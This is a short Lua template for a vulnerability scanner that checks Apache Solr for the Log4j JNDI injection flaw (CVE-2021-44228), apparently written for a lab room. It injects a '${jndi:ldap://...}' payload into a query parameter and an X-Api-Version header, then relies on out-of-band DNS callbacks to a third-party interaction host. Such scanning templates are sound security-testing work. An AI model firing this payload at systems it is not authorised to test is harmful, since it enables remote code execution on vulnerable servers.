-- @name       Apache Solr Log4j RCE (CVE-2021-44228)
-- @author     dirfuzz
-- @severity   critical
-- @cve        CVE-2021-44228
-- @tags       cve, cve2021, rce, oast, log4j, solr

function pre_scan(ctx)
    if string.find(ctx.target, "/solr") or string.find(ctx.base_url, "8983") then
        return { skip = false }
    end
    return { skip = true }
end

function run(ctx)
    -- 1. Generate the unique OOB callback URL for this execution
    local oob_domain, err = interactsh_url()
    if not oob_domain then
        print("[!] OOB offline, skipping Log4j payload")
        return nil
    end
    
    -- 2. Construct the JNDI payload
    local payload = "${jndi:ldap://" .. oob_domain .. "/Exploit}"

    -- 3. Fire the payload at the specific Solr admin endpoint known to be vulnerable in the THM room
    local target_url = ctx.base_url .. "/solr/admin/cores?foo=" .. url_encode(payload)

    local req = {
        method = "GET",
        url = target_url,
        headers = {
            ["User-Agent"] = "DirFuzz-OAST-Testing",
            ["X-Api-Version"] = payload -- Injecting here just to be thorough
        }
    }

    -- 4. Send the request
    http_send(req)

    -- Note: We DO NOT return a finding here! 
    -- We just fired the payload. The background Go Engine will catch the DNS interaction 
    -- from Interactsh and emit the Result automatically.
    return nil
end